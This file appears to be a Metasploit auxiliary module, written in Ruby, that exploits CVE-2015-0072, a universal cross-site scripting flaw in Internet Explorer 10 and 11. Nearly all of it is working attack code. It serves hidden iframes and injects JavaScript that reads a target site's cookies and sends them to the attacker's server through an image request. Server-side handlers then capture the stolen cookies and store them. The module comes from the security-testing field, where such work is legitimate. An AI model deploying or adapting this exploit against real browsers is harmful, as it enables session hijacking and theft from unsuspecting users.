# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
require &#039;msf/core&#039;
class Metasploit3 < Msf::Auxiliary
include Msf::Exploit::Remote::HttpServer
def initialize(info={})
super(update_info(info,
&#039;Name&#039; => "Microsoft Internet Explorer 10 and 11 Cross-Domain JavaScript Injection",
&#039;Description&#039; => %q{
This module exploits a universal cross-site scripting (UXSS) vulnerability found in Internet
Explorer 10 and 11. By default, you will steal the cookie from TARGET_URI (which cannot
have X-Frame-Options or it will fail). You can also have your own custom JavaScript
by setting the CUSTOMJS option. Lastly, you might need to configure the URIHOST option if
you are behind NAT.
},
&#039;License&#039; => MSF_LICENSE,
&#039;Author&#039; =>
[
&#039;David Leo&#039;, # Original discovery
&#039;filedescriptor&#039;, # PoC
&#039;joev&#039;, # He figured it out really
&#039;sinn3r&#039; # MSF
],
&#039;References&#039; =>
[
[ &#039;CVE&#039;, &#039;2015-0072&#039; ],
[ &#039;OSVDB&#039;, &#039;117876&#039; ],
[ &#039;URL&#039;, &#039;http://www.deusen.co.uk/items/insider3show.3362009741042107/&#039;],
[ &#039;URL&#039;, &#039;http://innerht.ml/blog/ie-uxss.html&#039; ],
[ &#039;URL&#039;, &#039;http://seclists.org/fulldisclosure/2015/Feb/10&#039; ]
],
&#039;Platform&#039; => &#039;win&#039;,
&#039;DisclosureDate&#039; => "Feb 1 2015"
))
register_options(
[
OptString.new(&#039;TARGET_URI&#039;, [ true, &#039;The URL for the target iframe&#039; ]),
OptString.new(&#039;CUSTOMJS&#039;, [ false, &#039;Custom JavaScript&#039; ])
], self.class)
end
def setup
if target_uri !~ /^http/i
raise Msf::OptionValidateError.new([&#039;TARGET_URI&#039;])
end
super
end
def target_uri
datastore[&#039;TARGET_URI&#039;]
end
def get_html
@html ||= html
end
def ninja_cookie_stealer_name
@ninja ||= "#{Rex::Text.rand_text_alpha(5)}.php"
end
def get_uri(cli=self.cli)
ssl = datastore["SSL"]
proto = (ssl ? "https://" : "http://")
if datastore[&#039;URIHOST&#039;]
host = datastore[&#039;URIHOST&#039;]
elsif (cli and cli.peerhost)
host = Rex::Socket.source_address(cli.peerhost)
else
host = srvhost_addr
end
if Rex::Socket.is_ipv6?(host)
host = "[#{host}]"
end
if datastore[&#039;URIPORT&#039;] != 0
port = &#039;:&#039; + datastore[&#039;URIPORT&#039;].to_s
elsif (ssl and datastore["SRVPORT"] == 443)
port = &#039;&#039;
elsif (!ssl and datastore["SRVPORT"] == 80)
port = &#039;&#039;
else
port = ":" + datastore["SRVPORT"].to_s
end
uri = proto + host + port + get_resource
uri
end
def server_uri
@server_uri ||= get_uri
end
def js
datastore[&#039;CUSTOMJS&#039;] || %Q|var e = document.createElement(&#039;img&#039;); e.src=&#039;#{server_uri}/#{ninja_cookie_stealer_name}?data=&#039; + encodeURIComponent(document.cookie);|
end
def html
%Q|
<iframe style="display:none" src="#{get_resource}/redirect.php"></iframe>
<iframe style="display:none" src="#{datastore[&#039;TARGET_URI&#039;]}"></iframe>
<script>
window.onmessage = function(e){ top[1].postMessage(atob("#{Rex::Text.encode_base64(js)}"),"*"); };
var payload = &#039;window.onmessage=function(e){ setTimeout(e.data); }; top.postMessage(\\\\"\\\\",\\\\"*\\\\")&#039;;
top[0].eval(&#039;_=top[1];with(new XMLHttpRequest)open("get","#{get_resource}/sleep.php",false),send();_.location="javascript:%22%3Cscript%3E&#039;+ encodeURIComponent(payload) +&#039;%3C%2Fscript%3E%22"&#039;);
</script>
|
end
def run
exploit
end
def extract_cookie(uri)
Rex::Text.uri_decode(uri.to_s.scan(/#{ninja_cookie_stealer_name}\?data=(.+)/).flatten[0].to_s)
end
def on_request_uri(cli, request)
case request.uri
when /redirect\.php/
print_status("Sending redirect")
send_redirect(cli, "#{datastore[&#039;TARGET_URI&#039;]}")
when /sleep\.php/
sleep(3)
send_response(cli, &#039;&#039;)
when /#{ninja_cookie_stealer_name}/
data = extract_cookie(request.uri)
if data.blank?
print_status("The XSS worked, but no cookie")
else
print_status("Got cookie")
print_line(data)
report_note(
:host => cli.peerhost,
:type => &#039;ie.cookie&#039;,
:data => data
)
path = store_loot(&#039;ie_uxss_cookie&#039;, "text/plain", cli.peerhost, data, "#{cli.peerhost}_ie_cookie.txt", "IE Cookie")
vprint_good("Cookie stored as: #{path}")
end
else
print_status("Sending HTML")
send_response(cli, get_html)
end
end


